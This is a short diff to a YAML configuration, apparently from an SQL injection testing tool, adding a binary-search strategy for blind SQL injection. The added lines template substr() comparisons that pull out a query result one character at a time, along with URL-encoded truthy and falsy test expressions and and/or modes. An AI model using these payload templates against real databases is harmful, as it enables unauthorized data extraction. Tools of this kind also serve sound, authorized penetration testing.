@@ -161,6 +161,33 @@ strategy:
     - Order by expression "1337" must be in the result list in this case
    vendorSpecific: case ${test} when true then space(5) else stringencode('a') end = space(5)
 
+ binary:
+  test:
+   bin: |
+    substr(
+        (${injection}),
+        ${window.char},
+        1
+    )
+    %3E%3D'${mid}'
+   truthyBin:
+    - "'a'%3E%3D'a'"
+    - "'a'%3E%3D'A'"
+    - "'a'%3E%3D'0'"
+    - "'b'%3E%3D'a'"
+    - "'b'%3E%3D'B'"
+    - "'1'%3E%3D'0'"
+   falsyBin:
+    - "'a'%3E%3D'b'"
+    - "'A'%3E%3D'a'"
+    - "'B'%3E%3D'b'"
+    - "'B'%3E%3D'a'"
+    - "'0'%3E%3D'A'"
+    - "'0'%3E%3D'1'"
+  modeAnd: and
+  modeOr: or
+  blind: ${binary.mode} ${test}
+
  union:
   indices: union select ${indices}
   capacity: |
